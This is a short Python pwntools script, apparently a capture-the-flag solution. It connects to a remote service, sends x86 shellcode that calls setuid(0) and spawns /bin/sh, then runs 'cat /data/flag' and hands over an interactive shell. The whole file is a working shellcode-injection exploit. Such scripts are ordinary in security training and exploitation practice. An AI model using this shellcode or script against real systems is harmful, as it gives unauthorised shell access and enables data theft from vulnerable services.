import time
import socket
from pwn import *

ip = "10.214.160.13"
port = 11003

target = remote(ip,port)
# target = process("./shellcode")

shellcode = b"\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x00\x00\x00\x00\x00\x00\x00"
getflag = "cat /data/flag\n"

target.sendline(shellcode)
target.sendline(getflag)
target.interactive()
